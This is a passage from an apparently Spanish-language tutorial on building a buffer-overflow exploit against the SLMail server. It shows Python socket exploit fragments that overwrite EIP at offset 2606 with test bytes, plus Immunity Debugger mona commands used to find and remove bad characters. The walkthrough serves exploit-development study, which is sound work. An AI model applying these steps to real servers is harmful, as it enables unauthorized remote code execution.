...
if __name__ == '__main__':
    ...
    data = s.recv(1024)
```
Proseguimos y sacamos el offset y metemos un nuevo payload para corroborar que tenemos el contros del EIP

``` 
 #!/usr/bin/python

 import socket, sys, signal, pdb
 ...
 if __name__ == '__main__':
     ...
     offset = 2606  # [*] /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 39694438
     after_EIP = "BBBB"
     payload = "A" * offset + after_EIP
 ...
 print "[*] Payload Controlando EIP + BBBB - Enviado con Exito [*]"
```
...
if __name__ == '__main__':
    ...
    offset = 2606         # [*] /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 39694438
    after_EIP = "BBBB"
    payload = "A" * offset + after_EIP + badchars
...
Vemos en Immunnity Debbuger que recibimos lo siguiente para el `registro ESP 0236A128`
Procedemos con el siguiente comando en Imunity Debugger
```bash
!mona compare -f <especificamos la ruta del bytearray.bin> -a "<dirección del ESP>"
!mona compare -f C:\\Users\\PacoBer\\Desktop\\SLMail\\bytearray.bin -a "0236A128"
```
...
```
 Nos creamos otra lista de bytearrays sin el badchars "\x00" y procedemos con los siquientes
 Nos volvemos a copiar los badchars almacenados en nuestra carpeta SLMail_bytearray
 
 Volvemos a fijarnos en el ESP
 ```bash
 !mona compare -f C:\\Users\\PacoBer\\Desktop\\SLMail\\bytearray.bin -a "0235A128"
 ```
 Quitamos el Badchar de nuestra lista de bytesarrays.bin
 ```bash
 !mona bytearray -cpb '"\x0a"'
 ```
